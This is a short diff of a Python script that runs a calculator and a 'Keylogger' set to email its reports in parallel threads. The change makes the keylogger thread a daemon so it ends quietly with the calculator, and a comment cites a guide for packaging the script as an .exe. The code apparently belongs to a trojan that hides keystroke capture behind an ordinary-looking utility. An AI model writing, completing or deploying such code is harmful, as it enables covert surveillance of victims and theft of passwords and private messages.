@@ -121,8 +121,14 @@ if __name__ == '__main__':
     my_logger = Keylogger(interval=REPORT_INTERVAL, report_mode='email')
 
     # use threading to begin the two tasks
-    Thread(target=calc.driver).start()
-    Thread(target=my_logger.start).start()
+    # By setting t2 (logger) to daemon, they're killed when the main program ends
+    # https://www.geeksforgeeks.org/python-different-ways-to-kill-a-thread/
+    t1 = Thread(target=calc.driver)
+    t2 = Thread(target=my_logger.start)
+    t2.daemon = True
+
+    t1.start()
+    t2.start()
 
 # guides used:
 # https://www.geeksforgeeks.org/convert-python-script-to-exe-file/
